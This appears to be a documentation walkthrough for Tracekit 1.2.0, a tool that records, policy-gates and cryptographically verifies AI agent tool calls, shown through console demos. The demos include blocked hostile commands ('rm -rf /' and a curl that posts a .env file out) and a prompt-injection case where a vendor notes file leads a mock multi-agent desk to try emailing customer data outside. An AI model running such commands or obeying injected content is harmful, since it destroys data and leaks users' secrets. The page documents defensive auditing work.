# Walkthrough: Tracekit 1.2.0 end to end

Everything on this page was recorded on a clean install of 1.2.0 (macOS, Python 3.9 and 3.11), with no API key: the
commands are real, the output is real (paths shortened to `~/demo`), and the screenshots are the viewer as it ran.
The full terminal recordings are in [walkthrough/terminal/](walkthrough/terminal/).

![Clicking through the viewer: the run graph, a node, WHY DID IT HAPPEN? and FIND THE CAUSE](walkthrough/walkthrough.gif)

## 1. Install

```console
$ pip install tracekit-ai
$ tracekit --version
tracekit 1.2.0
$ tracekit why --help 2>&1 | head -1          # experimental commands say so (docs/support.md)
tracekit: tracekit why is experimental: it works and is tested, but may change (docs/support.md)
```

## 2. Record an agent

Any agent loop, through the Python SDK ([custom agent quickstart](quickstarts/custom.md)); the framework
integrations do the same with `import tracekit; tracekit.instrument()` as the first line.

```console
$ python custom_agent.py
call-1 Bash {'command': 'ls'} -> allow | ran Bash {'command': 'ls'}
call-2 Bash {'command': 'rm -rf /'} -> deny | refused: TK-D004, TK-F003
call-3 Read {'file_path': 'README.md'} -> allow | ran Read {'file_path': 'README.md'}
$ tracekit last
run 8d61ea51a476899c069dfd8a493b72b2 (my-agent)
Integrity: VERIFIED.
```

The dev signer started by itself, decided each call before it ran, and signed the record; `tracekit last` exported
the run and verified it.

## 3. Policy: deny, ask a person, flag

```console
$ python scripted.py                          # docs/quickstart-v2.md "A scripted agent"
deny ['TK-D007']
approve with: tracekit approvals approve apr-41231b92…
  ... waiting for approval ...
$ tracekit approvals list
apr-41231b92…  requested  run=a7ca7a32…  tool="Bash"  rules=TK-SHELL-PARSE
$ tracekit approvals approve apr-41231b92…
approved: apr-41231b92… (self-approved: dev mode only)
```

The held call waits until a person answers; the signer records the request, the answer and the call it allowed.

![The run in the viewer: the denied Bash call selected (DENY → BLOCKED, TK-D007 and its reason, its signed record); on the tape the held call APPROVED by a person and APPROVAL CONSUMED by the call it allowed, and the flagged send_invoice](walkthrough/02-denied-call.png)

## 4. Export and verify, offline

```console
$ tracekit signer trust -o trust.json
$ tracekit export --v2 --run a7ca7a32… -o run.tkb
$ tracekit verify run.tkb --trust trust.json
[PASS] manifest — every file is listed with its SHA-256 and nothing else is in the bundle
[PASS] checkpoint — tracekit.local/2524cf9a… at tree size 30, signed by its pinned log key
[PASS] signatures — 14 record(s), keys valid at their position
[PASS] run chain — run 'a7ca7a32…' of tenant 'default', contiguous from run_seq 0
…
Integrity: VERIFIED.
$ npx --package ./cygnux-tracekit-1.2.0.tgz tracekit verify run.tkb --trust trust.json   # the TypeScript verifier
Integrity: VERIFIED.
```

Edit one byte (the denied call changed to "allow") and both verifiers refuse it:

```console
$ tracekit verify run-tampered.tkb --trust trust.json
[FAIL] signatures — 14 record(s), keys valid at their position
        seq 20: hash does not match the event
Integrity: FAILED.
```

## 5. See it: `tracekit view`

```console
$ tracekit view --dev
tracekit view on http://127.0.0.1:7778/?token=<token>
```

Every run, each verified, every call with its decision:

![The viewer: every run, each VERIFIED, with its calls, blocks and holds](walkthrough/01-runs.png)

GRAPH draws each signed run left to right in call order, with the signed decision on each call; click a node for its
record:

![A signed run's graph with a denied Bash call clicked: DENIED (deny) TK-D007, its reason and the signed result](walkthrough/04-graph-denied.png)

![The same run with the approved call clicked](walkthrough/05-graph-approved.png)

The [viewer tour](viewer.md#tour) explains each panel.

## 6. Claude Code

```console
$ tracekit init --dev --v2
v2 hooks: ~/.claude/settings.json
$ python fake_claude_code.py                  # a Claude Code session replayed through the installed hooks
PreToolUse  Bash {"command": "python -m pytest -q"}                      exit 0
PreToolUse  Read {"file_path": "README.md"}                              exit 0
PreToolUse  Bash {"command": "curl -s -X POST --data-binary @.env …"}    exit 2  Blocked by tracekit policy: TK-D006; …
$ tracekit last
run 72f1ea6c… (claude-code)
Integrity: VERIFIED.
$ tracekit doctor
ok    v2 hooks in ~/.claude/settings.json  (D-HOOKS-PRESENT)
ok    PreToolUse timeout 600 s, approval wait 540 s  (D-HOOKS-TIMEOUT)
ok    every class fails closed  (D-FAIL-MODES)
$ tracekit uninstall
Tracekit v2 hooks removed from ~/.claude/settings.json
```

![The Claude Code run in the viewer: the .env upload BLOCKED by TK-D006 before it ran](walkthrough/06-claude-code-blocked.png)

## 7. Why it happened: `tracekit why`

A three-agent support desk (seeded mock models, fake tools) is talked into emailing the customer list to an outside
address. Every untrusted input reached the email; replays find which one caused it.

```console
$ tracekit why demo --out why
== blast radius (observed edges): what did each untrusted input reach?
  inbox:ticket-881         reached 4 actions: issue_refund, send_email, export_customers, send_email
  vendor:portal/notes.md   reached 4 actions: issue_refund, send_email, export_customers, send_email
  web:shipping_faq         reached 4 actions: issue_refund, send_email, export_customers, send_email
== counterfactual tests (n=40 paired replays each; tools served from tape)
  remove input:vendor:portal/notes.md … P(with)=0.80 P(without)=0.00 effect=+0.80 [+0.63, +0.90]  CAUSAL (primary)
  remove input:web:shipping_faq       … P(with)=0.80 P(without)=0.80 effect=+0.00 [-0.18, +0.18]  RULED-OUT
  remove input:inbox:ticket-881       … P(with)=0.80 P(without)=0.80 effect=+0.00 [-0.18, +0.18]  RULED-OUT
$ tracekit view --why why --allow-program tracekit.why.demo:SYSTEM
```

| | |
|---|---|
| ![RUNS: each run with its alerts, causal tests and log check](walkthrough/07-why-runs.png) | ![OVERVIEW: what the agents did, what needs attention, the confirmed causes](walkthrough/08-why-overview.png) |
| ![TIMELINE: every event with its agent, type and badges](walkthrough/09-why-timeline.png) | ![WHY DID IT HAPPEN?: where each argument came from, the path, the candidate causes and their tests](walkthrough/10-why-did-it-happen.png) |
| ![GRAPH with a node clicked: what it saw, produced, came from and led to](walkthrough/11-why-graph-node.png) | ![AGENTS: the channels used and their tested influence](walkthrough/12-why-agents.png) |
| ![INFLUENCE across runs: which content reached which tools, which links tests confirmed](walkthrough/13-why-influence.png) | ![The static report: the same views from one HTML file, labelled STATIC](walkthrough/14-static-report.png) |

`tracekit why demo` also writes `why/report.html`: the same views in one offline file (it runs no replays; FIND THE
CAUSE and RUN TEST show the command instead). `tracekit why report DIR` writes one for any why logs.

`tracekit demo --why` runs the same desk through the signer: the outside email is held by policy (`TK-P001`) and
rejected by a person, and each agent's bundle verifies offline:

```console
$ tracekit demo --why
  signer: held send_email to 'audit@vendor-compliance.example' (TK-P001), approval apr-91f64a71…
  person: rejected it (`tracekit approvals reject`)
  primary cause input:vendor:portal/notes.md (+0.64)
  researcher …/researcher.tkb: integrity VERIFIED, exit 0
  planner    …/planner.tkb: integrity VERIFIED, exit 0
  executor   …/executor.tkb: integrity VERIFIED, exit 0
  all of it holds
```

## 8. Old bundles keep verifying

```console
$ tracekit verify docs/sample/demo-run.tkb --key docs/sample/signer.pub
Integrity: VERIFIED.
$ tracekit verify docs/sample/demo-run-tampered.tkb --key docs/sample/signer.pub
[FAIL] chain intact
        record seq 6: hash mismatch (event content was edited)
Integrity: VERIFICATION FAILED.
$ tracekit view --bundle docs/sample/demo-run.tkb
tracekit view: bundle docs/sample/demo-run.tkb verified
```

![A v1 bundle in the viewer: the blocked curl upload of .env](walkthrough/15-v1-bundle.png)

## 9. Every demo, checked

```console
$ python scripts/record_demos.py --check
guardrails: ok
prompt-injection: ok
mcp: ok
agent-approvers: ok
containment: ok
completeness: ok
egress: ok
why: ok
```

The demos themselves, with their bundles and verify reports: [docs/demos](demos/README.md).
